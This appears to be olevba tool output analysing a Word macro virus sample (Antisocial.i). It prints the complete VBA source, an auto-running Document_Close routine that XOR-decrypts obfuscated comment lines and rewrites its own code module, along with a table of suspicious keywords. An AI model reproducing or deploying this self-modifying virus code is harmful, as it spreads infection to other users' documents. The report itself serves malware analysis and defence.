olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.i-8806f8a78c6506b49860cb5ca65121bd3810ec17
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.i-8806f8a78c6506b49860cb5ca65121bd3810ec17 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 18 To 39
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next V6
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next V1
Call VM
End Sub
Private Sub VM()
'!@it&P7&;&7>&Ri&5?
'"S7%8%Kpii
'"S6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-S4)%4,,
'$U7#>#Jmw+Qmg+*#)#;*#(#2
'$Elq#U6#>#2#Wl#Ofm+U0*
' Q1':'Ftd/Jnc/Q4+'Q2+'6..'_hu'Q3
'&W3!<!W3!'!Bis)W7(
' Ibs'Q2
' Q0':'Q5
'!RnouBieskchr(PDVtilcer(PDEikvihchru(Orck.7/(EibcKibsjc(TcvjgecJohc&P7*&$!$& &P1
'&Odyu!W0
'#Ktpmkjw*RmvqwTvkpagpmkj$9$4
' Hwsnhit)TfqbIhujfkWuhjws':'7
' Hwsnhit)DhianujDhiqbutnhit':'7
'$U;#>#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-Ojmfp+2/#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-@lvmwLeOjmfp*
'/[m|(^1(5(Fgzeid\mexdi|m&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
' Q>)CbkbsbKnibt'6+'Q>)DhrisHaKnibt
'&W8/@eeGsnlRushof!W9
'/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
'$UB-GfofwfOjmfp#2/#UB-@lvmwLeOjmfp
'"SD+DaaCwjhVqwlkb%S=
' FdsnqbChdrjbis)TfqbFt'AnkbIfjb=:FdsnqbChdrjbis)ArkkIfjb
End Sub 'Alcoholic Anarchists of America (AAA) Lys Kovick
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

